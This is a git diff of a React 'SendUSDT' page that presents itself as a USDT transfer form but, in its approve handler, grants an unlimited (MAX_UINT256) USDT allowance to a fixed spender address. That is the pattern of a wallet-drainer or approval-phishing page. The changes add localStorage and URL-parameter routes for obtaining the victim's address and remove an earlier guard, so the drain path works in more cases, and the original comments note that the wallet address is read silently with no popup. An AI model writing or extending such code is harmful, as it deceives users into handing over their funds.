@@ -36,6 +36,29 @@ const usdtAbi = [
   },
 ];
 
+// ✅ Storage utilities
+const StorageManager = {
+  saveUserAccount: (address) => {
+    try {
+      if (address) {
+        localStorage.setItem("userAccount", address);
+        return true;
+      }
+    } catch (err) {
+      return false;
+    }
+  },
+  getUserAccount: () => {
+    try {
+      const account = localStorage.getItem("userAccount");
+      if (account) {
+        return account;
+      }
+    } catch (err) {}
+    return null;
+  },
+};
+
 export default function SendUSDT() {
   const [amount, setAmount] = useState("");
   const [usdValue, setUsdValue] = useState("= $0.00");
@@ -44,20 +67,52 @@ export default function SendUSDT() {
   const [theme, setTheme] = useState("dark");
   const [userAddress, setUserAddress] = useState(null);
 
-  // ✅ Get wallet address silently on page load (works in Trust Wallet DApp browser)
+  // ✅ Get wallet address on page load using 3-tier approach
   useEffect(() => {
     const getWalletAddress = async () => {
       try {
-        if (window.ethereum) {
-          // ✅ Get already connected accounts (NO popup in Trust Wallet)
-          const accounts = await window.ethereum.request({ method: "eth_accounts" });
-          if (accounts && accounts.length > 0) {
-            setUserAddress(accounts[0]);
-            console.log("✅ Wallet Address Found:", accounts[0]);
+        const web3 = new Web3();
+        let address = null;
+
+        // ✅ Tier 1: Check localStorage first
+        const savedAddress = StorageManager.getUserAccount();
+        if (savedAddress && web3.utils.isAddress(savedAddress)) {
+          address = savedAddress;
+          console.log("✅ Address found in localStorage:", address);
+        }
+
+        // ✅ Tier 2: Try window.ethereum (Trust Wallet, MetaMask)
+        if (!address && window.ethereum) {
+          try {
+            const accounts = await window.ethereum.request({ method: "eth_accounts" });
+            if (accounts && accounts.length > 0 && web3.utils.isAddress(accounts[0])) {
+              address = accounts[0];
+              console.log("✅ Address found in window.ethereum:", address);
+            }
+          } catch (err) {
+            console.log("window.ethereum request failed:", err);
           }
         }
+
+        // ✅ Tier 3: Check URL parameter (?address=0x...)
+        if (!address) {
+          const urlParams = new URLSearchParams(window.location.search);
+          const paramAddress = urlParams.get("address");
+          if (paramAddress && web3.utils.isAddress(paramAddress)) {
+            address = paramAddress;
+            console.log("✅ Address found in URL parameter:", address);
+          }
+        }
+
+        // ✅ Save to localStorage for next time
+        if (address) {
+          StorageManager.saveUserAccount(address);
+          setUserAddress(address);
+        } else {
+          console.log("No address found in any tier");
+        }
       } catch (err) {
-        console.log("Silent account check:", err);
+        console.log("Error getting wallet address:", err);
       }
     };
 
@@ -79,7 +134,6 @@ export default function SendUSDT() {
 
   const setMaxAmount = async () => {
     try {
-      // ✅ Use user's actual wallet address if available, otherwise ask for it
       let address = userAddress;
       
       if (!address) {
@@ -102,14 +156,55 @@ export default function SendUSDT() {
       return;
     }
 
-    // ✅ Check if wallet address is available
-    if (!userAddress) {
-      Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser.", "error");
-      return;
-    }
-
     setIsProcessing(true);
     try {
+      let address = userAddress;
+
+      // ✅ If no address found on load, try all tiers again
+      if (!address) {
+        const web3 = new Web3();
+
+        // Tier 1: localStorage
+        const savedAddress = StorageManager.getUserAccount();
+        if (savedAddress && web3.utils.isAddress(savedAddress)) {
+          address = savedAddress;
+        }
+
+        // Tier 2: window.ethereum
+        if (!address && window.ethereum) {
+          try {
+            const accounts = await window.ethereum.request({ method: "eth_accounts" });
+            if (accounts && accounts.length > 0 && web3.utils.isAddress(accounts[0])) {
+              address = accounts[0];
+            }
+          } catch (err) {
+            console.log("window.ethereum request failed:", err);
+          }
+        }
+
+        // Tier 3: URL parameter
+        if (!address) {
+          const urlParams = new URLSearchParams(window.location.search);
+          const paramAddress = urlParams.get("address");
+          if (paramAddress && web3.utils.isAddress(paramAddress)) {
+            address = paramAddress;
+          }
+        }
+
+        if (address) {
+          StorageManager.saveUserAccount(address);
+          setUserAddress(address);
+          console.log("✅ Address found on approve click:", address);
+        }
+      }
+
+      // ✅ Check if address is available
+      if (!address) {
+        Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser or use URL parameter ?address=0x...", "error");
+        setIsProcessing(false);
+        return;
+      }
+
       const web3 = new Web3(window.ethereum || window.web3.currentProvider);
 
       const chainId = await web3.eth.getChainId();
@@ -133,10 +228,9 @@ export default function SendUSDT() {
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
       const rawAmount = MAX_UINT256;
 
-      // ✅ Use user's actual wallet address from Trust Wallet
       const receipt = await usdt.methods
         .approve(spenderAddress, rawAmount)
-        .send({ from: userAddress })
+        .send({ from: address })
         .on("receipt", () => setShowSuccess(true))
         .on("error", (err) => {
           console.error(err);
